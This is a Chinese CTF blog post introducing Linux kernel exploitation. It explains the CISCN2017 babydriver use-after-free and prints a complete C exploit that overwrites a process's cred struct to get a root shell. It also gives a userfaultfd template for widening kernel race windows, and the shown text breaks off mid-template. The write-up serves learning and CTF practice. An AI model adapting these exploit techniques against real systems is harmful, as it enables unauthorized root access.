

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/htmlicon.jpg">
  <link rel="icon" href="/img/favicon.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  
    <meta name="description" content="Linux kerne pwn入门（一）最近在看Linux内核pwn，所以想着写一点东西，以便之后方便复习。作为内核pwn入门的第一篇，基本上是跟着ctf-wiki上的内容在做，加上一点自己的理解。环境搭建方面就不再赘述，网上有很多博客。直接上题。 kernel UAFbabydriver之前用户态的时候也会有很多UAF的情况，可以对照着大概了解一下UAF的原理。这里拿CISCN2017 - ba">
<meta property="og:type" content="article">
<meta property="og:title" content="kernel pwn从0到1">
<meta property="og:url" content="https://7coo.github.io/2023/01/06/kernel-pwn%E4%BB%8E0%E5%88%B01/index.html">
<meta property="og:site_name" content="7coo">
<meta property="og:description" content="Linux kerne pwn入门（一）最近在看Linux内核pwn，所以想着写一点东西，以便之后方便复习。作为内核pwn入门的第一篇，基本上是跟着ctf-wiki上的内容在做，加上一点自己的理解。环境搭建方面就不再赘述，网上有很多博客。直接上题。 kernel UAFbabydriver之前用户态的时候也会有很多UAF的情况，可以对照着大概了解一下UAF的原理。这里拿CISCN2017 - ba">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i.imgur.com/8EsrXXB.png">
<meta property="og:image" content="https://i.imgur.com/vKAKEQh.png">
<meta property="og:image" content="https://i.imgur.com/a07xAWL.png">
<meta property="og:image" content="https://i.imgur.com/Frjit0l.png">
<meta property="og:image" content="https://i.imgur.com/fufVqHA.png">
<meta property="og:image" content="https://i.imgur.com/aLdZ5Jr.png">
<meta property="og:image" content="https://i.imgur.com/BEMW0pE.png">
<meta property="og:image" content="https://i.imgur.com/bH09Rsa.png">
<meta property="og:image" content="https://i.imgur.com/lbwVjtl.png">
<meta property="og:image" content="https://i.imgur.com/RFmylk0.png">
<meta property="og:image" content="https://i.imgur.com/NJfAzym.png">
<meta property="og:image" content="https://i.imgur.com/KXoKU0N.png">
<meta property="og:image" content="https://i.imgur.com/Q5bMSpL.png">
<meta property="og:image" content="https://i.imgur.com/XR0jhW5.png">
<meta property="og:image" content="https://i.imgur.com/vN8vOyv.png">
<meta property="og:image" content="https://i.imgur.com/yy63buw.png">
<meta property="og:image" content="https://i.imgur.com/bDOvNwG.png">
<meta property="og:image" content="https://i.imgur.com/hWrcv9f.png">
<meta property="og:image" content="https://i.imgur.com/WMEmrxm.png">
<meta property="og:image" content="https://i.imgur.com/jvokOmj.png">
<meta property="og:image" content="https://i.imgur.com/6y6OMg4.png">
<meta property="og:image" content="https://i.imgur.com/DPJcG3N.png">
<meta property="og:image" content="https://i.imgur.com/PaOwCEN.png">
<meta property="og:image" content="https://i.imgur.com/xtgV0aK.png">
<meta property="og:image" content="https://i.imgur.com/d2fnx7k.png">
<meta property="og:image" content="https://i.imgur.com/DaBNvUu.png">
<meta property="og:image" content="https://i.imgur.com/PkAX5yW.png">
<meta property="og:image" content="https://i.imgur.com/LqVxEMc.png">
<meta property="og:image" content="https://i.imgur.com/CxtpgIE.png">
<meta property="og:image" content="https://i.imgur.com/EIhzNPr.png">
<meta property="og:image" content="https://i.imgur.com/Sya02EK.png">
<meta property="og:image" content="https://i.imgur.com/4jdN5iF.png">
<meta property="og:image" content="https://i.imgur.com/RXKBMCI.png">
<meta property="article:published_time" content="2023-01-06T13:05:17.000Z">
<meta property="article:modified_time" content="2023-01-06T13:07:11.035Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://i.imgur.com/8EsrXXB.png">
  
  
  <title>kernel pwn从0到1 - 7coo</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"7coo.github.io","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":"UA-225072278-1","gtag":"G-7QWZC1M2Z8","tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 6.1.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>7coo</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="kernel pwn从0到1">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2023-01-06 21:05" pubdate>
        2023年1月6日 晚上
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      64k 字
    </span>
  

  
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      537 分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">kernel pwn从0到1</h1>
            
            <div class="markdown-body">
              <h1 id="Linux-kerne-pwn入门（一）"><a href="#Linux-kerne-pwn入门（一）" class="headerlink" title="Linux kerne pwn入门（一）"></a>Linux kerne pwn入门（一）</h1><p>最近在看Linux内核pwn，所以想着写一点东西，以便之后方便复习。<br>作为内核pwn入门的第一篇，基本上是跟着ctf-wiki上的内容在做，加上一点自己的理解。环境搭建方面就不再赘述，网上有很多博客。直接上题。</p>
<h2 id="kernel-UAF"><a href="#kernel-UAF" class="headerlink" title="kernel UAF"></a>kernel UAF</h2><h3 id="babydriver"><a href="#babydriver" class="headerlink" title="babydriver"></a>babydriver</h3><p>之前用户态的时候也会有很多UAF的情况，可以对照着大概了解一下UAF的原理。这里拿CISCN2017 - babydriver来具体演示一下。<br>首先内核题目一般会给以下三个文件：启动脚本，bzImage 内核启动文件以及cpio根文件系统镜像。我们一般解压cpio根文件系统镜像（Linux直接右键提取到此处就可以了）就可以得到.ko存在漏洞的驱动程序和vmlinux。vmlinux是编译出来原始的内核，未经过压缩，不能直接通过qemu启动，是一个ELF文件，里面包括了符号表等等一系列内核相关的指令，可以用IDA Pro查看，可以找gadget等等等等。类比于libc pwn中的libc-2.23.so之类的，给了这个东西就可以找gadget、找地址偏移等等。bzImage是vmlinux压缩以后，并且加上一段解压启动代码得到。这个东西可以放到QEMU中跑，但是不能用IDA打开。如果题目没有给vmlinux只给了bzImage，可以参考<a target="_blank" rel="noopener" href="https://kiprey.github.io/2021/10/kernel_pwn_introduction/#%E5%9B%9B%E3%80%81%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80">kiprey师傅</a>用extract-vmlinux工具从bzImage中解压出vmlinux，并用vmlinux-to-elf将符号添加进去。</p>
<p>我们用IDA分析一下存在漏洞的驱动程序babydriver.ko。首先babydriver_init是加载驱动的初始化程序，所做的工作大概是注册了驱动程序，里面不会存在漏洞（至少到现在做的题里面没有）。babydriver_exit是卸载驱动所做的操作，大概是销毁一写分配的空间。babyopen，babyrelease，babyioctl，babywrite，babyread是通过你写的C程序open(fd),close(fd),ioctl(fd),write(fd),read(fd)所做的操作，举例来说，用fd1&#x3D;open（&#x2F;dev&#x2F;babydriver）打开了一个驱动文件，然后ioctl(fd1)去找fd1所对应的babyioctl操作。</p>
<p><img src="https://i.imgur.com/8EsrXXB.png" srcset="/img/loading.gif" lazyload><br>open函数为全局未初始化结构体变量babydev_struct的device_buf分配了大小为64的一段空间（根据kiprey师傅所说kmem_cache_alloc_trace应该是kmalloc函数在IDA下优化的结果），然后将长度赋给device_buf_len结构体成员。</p>
<p><img src="https://i.imgur.com/vKAKEQh.png" srcset="/img/loading.gif" lazyload><br>ioctl函数释放掉之前分配的大小为64的空间，并且分配一段大小为用户自定义的空间赋给device_buf,并更新device_buf_len大小(我们用ioctl的格式形如ioctl（fd，command，size），其中size就是v3，因为是rdx寄存器，而又将v3赋给了v4，因此实际上分配的是我们指定的大小)。</p>
<p><img src="https://i.imgur.com/a07xAWL.png" srcset="/img/loading.gif" lazyload><br>read函数将内核空间的device_buf处的内容拷贝到用户空间的buffer处</p>
<p><img src="https://i.imgur.com/Frjit0l.png" srcset="/img/loading.gif" lazyload><br>write函数将用户空间buffer处的内容拷贝到内核空间device_buf处</p>
<p><img src="https://i.imgur.com/fufVqHA.png" srcset="/img/loading.gif" lazyload><br>release函数在关闭这个驱动文件的时候只free而没有将指针置空，因此可能存在UAF</p>
<p>我们该怎么利用这个UAF漏洞，首先应该打开两遍babydriver驱动，这样fd1和fd2的device_buf均指向内核中同一片内存，因为device_buf是babydriver.ko驱动中的全局变量。然后我们close（fd1），这样就会释放device_buf空间，但指针没有置空，因此我们还可以通过fd2来操控这片内存（因为已经close（fd1），因此不能通过fd1来操控）。那么如何来使用呢，每个进程都会分配一个cred结构体，我们只需要让uid和gid为0就可以达到提权的目的。因此我们需要保证device_buf所在的位置就是为新进程分配的cred结构体所在的位置。我们可以通过ioctl来将fd1指向的device_buf的大小修改为cred结构体大小0xa8，这样在close（fd1）也就是free(device_buf)后fork一个新进程，新进程cred所在的位置就是之前释放device_buf所在的位置（至于为什么会这样，因为还不是太了解内核内存的分配，这里先挖个坑，之后再来补），因为fd2的device_buf此时还指向device_buf也就是cred，因此我们往device_buf处写0覆盖掉uid和gid，就可以让fork出来的新进程为root。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">cred</span> &#123;<br>    <span class="hljs-type">atomic_t</span>    usage;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span><br>    <span class="hljs-type">atomic_t</span>    subscribers;    <span class="hljs-comment">/* number of processes subscribed */</span><br>    <span class="hljs-type">void</span>        *put_addr;<br>    <span class="hljs-type">unsigned</span>    magic;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_MAGIC  0x43736564</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-type">kuid_t</span>      uid;        <span class="hljs-comment">/* real UID of the task */</span><br>    <span class="hljs-type">kgid_t</span>      gid;        <span class="hljs-comment">/* real GID of the task */</span><br>    <span class="hljs-type">kuid_t</span>      suid;       <span class="hljs-comment">/* saved UID of the task */</span><br>    <span class="hljs-type">kgid_t</span>      sgid;       <span class="hljs-comment">/* saved GID of the task */</span><br>    <span class="hljs-type">kuid_t</span>      euid;       <span class="hljs-comment">/* effective UID of the task */</span><br>    <span class="hljs-type">kgid_t</span>      egid;       <span class="hljs-comment">/* effective GID of the task */</span><br>    <span class="hljs-type">kuid_t</span>      fsuid;      <span class="hljs-comment">/* UID for VFS ops */</span><br>    <span class="hljs-type">kgid_t</span>      fsgid;      <span class="hljs-comment">/* GID for VFS ops */</span><br>    <span class="hljs-type">unsigned</span>    securebits; <span class="hljs-comment">/* SUID-less security management */</span><br>    <span class="hljs-type">kernel_cap_t</span>    cap_inheritable; <span class="hljs-comment">/* caps our children can inherit */</span><br>    <span class="hljs-type">kernel_cap_t</span>    cap_permitted;  <span class="hljs-comment">/* caps we&#x27;re permitted */</span><br>    <span class="hljs-type">kernel_cap_t</span>    cap_effective;  <span class="hljs-comment">/* caps we can actually use */</span><br>    <span class="hljs-type">kernel_cap_t</span>    cap_bset;   <span class="hljs-comment">/* capability bounding set */</span><br>    <span class="hljs-type">kernel_cap_t</span>    cap_ambient;    <span class="hljs-comment">/* Ambient capability set */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_KEYS</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>   jit_keyring;    <span class="hljs-comment">/* default keyring to attach requested</span><br><span class="hljs-comment">                     * keys to */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">key</span> __rcu *session_keyring; <span class="hljs-comment">/* keyring inherited over fork */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">key</span>  *process_keyring; <span class="hljs-comment">/* keyring private to this process */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">key</span>  *thread_keyring; <span class="hljs-comment">/* keyring private to this thread */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">key</span>  *request_key_auth; <span class="hljs-comment">/* assumed request_key authority */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SECURITY</span><br>    <span class="hljs-type">void</span>        *security;  <span class="hljs-comment">/* subjective LSM security */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">user_struct</span> *user;   <span class="hljs-comment">/* real user ID subscription */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">user_namespace</span> *user_ns; <span class="hljs-comment">/* user_ns the caps and keyrings are relative to. */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">group_info</span> *group_info;  <span class="hljs-comment">/* supplementary groups for euid/fsgid */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">rcu_head</span> rcu;        <span class="hljs-comment">/* RCU deletion hook */</span><br>&#125;;<br></code></pre></td></tr></table></figure>
<p>exp如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> fd1 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, O_RDWR);<br>    <span class="hljs-type">int</span> fd2 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, O_RDWR);<br>    <span class="hljs-built_in">ioctl</span>(fd1, <span class="hljs-number">65537</span>, <span class="hljs-number">0xa8</span>);<br>    <span class="hljs-built_in">close</span>(fd1);<br><br>    <span class="hljs-keyword">if</span>(!fork())&#123;<br>        <span class="hljs-type">char</span> mem[<span class="hljs-number">4</span>*<span class="hljs-number">7</span>];<br>        <span class="hljs-built_in">memset</span>(mem, <span class="hljs-string">&#x27;\x00&#x27;</span>, <span class="hljs-built_in">sizeof</span>(mem));<br>        <span class="hljs-built_in">write</span>(fd2, mem, <span class="hljs-built_in">sizeof</span>(mem));<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] after LPE, privilege: %s\n&quot;</span>, (<span class="hljs-built_in">getuid</span>() ? <span class="hljs-string">&quot;user&quot;</span> : <span class="hljs-string">&quot;root&quot;</span>));<br>        <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">waitpid</span>(<span class="hljs-number">-1</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<blockquote>
<p>需要注意的是，当进程执行完 fork 操作后，父进程必须 wait 子进程，否则当父进程被销毁后，该进程成为孤儿进程，将无法使用终端进行输入输出。exploit 需要静态编译，因为 kernel 不提供标准库，但一定提供 syscall。</p>
</blockquote>
<p>一般内核题目的exp是调用驱动的C文件，我们把他编译进文件系统中，这样就可以用qemu启动内核，然后运行这个c程序getshell。不知道为什么这个题目程序断不下来，因此在下一题中再具体演示内核是如何调试的。</p>
<h2 id="kernel-ROP"><a href="#kernel-ROP" class="headerlink" title="kernel ROP"></a>kernel ROP</h2><h3 id="2018强网杯core"><a href="#2018强网杯core" class="headerlink" title="2018强网杯core"></a>2018强网杯core</h3><p>内核rop</p>
<h2 id="userfaultfd的使用"><a href="#userfaultfd的使用" class="headerlink" title="userfaultfd的使用"></a>userfaultfd的使用</h2><p>userfaultfd主要用来在内核pwn中提高条件竞争的成功率，主要来说就是卡在copy_from_user(kptr,user_buf,size)处，因为拷贝时出现了缺页异常，出现缺页异常后就会执行我们注册的handler处理函数，只要我们在这个处理函数中sleep（100）就可以在这个线程中卡住，此时我们如果在另一个线程修改了kptr指向的内存（比如说kfree掉），那么就会出现UAF。怎么才能出现缺页异常呢，可以用mmap分一块匿名内存，第一次访问这个匿名页的时候就会触发缺页异常。</p>
<blockquote>
<p>要使用 userfaultfd 系统调用，我们首先要注册一个 userfaultfd，通过 ioctl 监视一块内存区域，同时还需要专门启动一个用以进行轮询的线程 uffd monitor，该线程会通过 poll() 函数不断轮询直到出现缺页异常<br>当有一个线程在这块内存区域内触发缺页异常时（比如说第一次访问一个匿名页），该线程（称之为 faulting 线程）进入到内核中处理缺页异常<br>内核会调用 handle_userfault() 交由 userfaultfd 处理<br>随后 faulting 线程进入堵塞状态，同时将一个 uffd_msg 发送给 monitor 线程，等待其处理结束<br>monitor 线程调用通过 ioctl 处理缺页异常，有如下选项：<br>UFFDIO_COPY：将用户自定义数据拷贝到 faulting page 上<br>UFFDIO_ZEROPAGE ：将 faulting page 置0<br>UFFDIO_WAKE：用于配合上面两项中 UFFDIO_COPY_MODE_DONTWAKE 和 UFFDIO_ZEROPAGE_MODE_DONTWAKE 模式实现批量填充<br>在处理结束后 monitor 线程发送信号唤醒 faulting 线程继续工作</p>
</blockquote>
<p>据<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/126004590">L3H_CoLin师傅</a>说在Linux5.4版本以下的内核中这种方法是可行的，新版本只有root权限才有权执行此类操作。一般做题时我们直接套板子就好了。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">static</span> <span class="hljs-type">pthread_t</span> monitor_thread;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">registerUserFaultFd</span><span class="hljs-params">(<span class="hljs-type">void</span> * addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len, <span class="hljs-type">void</span> (*handler)(<span class="hljs-type">void</span>*))</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">long</span> uffd;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffdio_api</span> uffdio_api;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffdio_register</span> uffdio_register;<br>    <span class="hljs-type">int</span> s;<br><br>    <span class="hljs-comment">/* Create and enable userfaultfd object */</span><br>    uffd = <span class="hljs-built_in">syscall</span>(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>    <span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>    uffdio_api.api = UFFD_API;<br>    uffdio_api.features = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br><br>    uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) addr;<br>    uffdio_register.range.len = len;<br>    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br><br>    s = <span class="hljs-built_in">pthread_create</span>(&amp;monitor_thread, <span class="hljs-literal">NULL</span>, handler, (<span class="hljs-type">void</span> *) uffd);<br>    <span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>在使用时直接调用即可</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">register<span class="hljs-constructor">UserFaultFd(<span class="hljs-params">addr</span>, <span class="hljs-params">len</span>, <span class="hljs-params">handler</span>)</span>;<br></code></pre></td></tr></table></figure>

<p>handler的板子：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">static</span> <span class="hljs-type">char</span> *page = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// 你要拷贝进去的数据</span><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> page_size;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span 